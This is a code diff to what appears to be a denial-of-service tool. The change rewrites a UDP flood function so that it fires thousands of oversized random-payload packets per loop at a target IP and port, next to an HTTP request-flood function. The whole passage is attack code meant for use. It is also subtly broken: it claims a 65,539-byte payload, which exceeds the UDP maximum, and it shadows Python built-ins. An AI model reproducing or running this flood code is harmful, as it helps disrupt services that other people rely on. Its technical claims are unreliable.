@@ -1048,12 +1048,24 @@ def REQ_attack(ip, secs, port):
             requests.head(ip, headers=headers)
             scraper.get(ip, headers=headers)
 
-def attack_udp(ip, port, secs, size):
-    while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+def attack_udp(ip, port, secs, size=65507):
+    end_time = time.time() + secs
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    while time.time() < end_time:
         dport = random.randint(1, 65535) if port == 0 else port
-        data = random._urandom(size)
-        s.sendto(data, (ip, dport))
+        bytes = random._urandom(size)  # Max UDP payload base
+        # Generate random hex payload
+        ran = random.randrange(10 ** 80)
+        hex = "%064x" % ran
+        hex = hex[:64]  # 64-char hex string
+        hex_bytes = bytes.fromhex(hex)  # 32 bytes
+        payload = hex_bytes + bytes  # 65,539 bytes total
+        # Extreme packet barrage
+        for _ in range(100):  # Base payload burst
+            s.sendto(bytes, (ip, dport))
+        for _ in range(4900):  # Hex-enhanced flood
+            s.sendto(payload, (ip, dport))
+    s.close()
 
 def attack_tcp(ip, port, secs, size):
     while time.time() < secs:
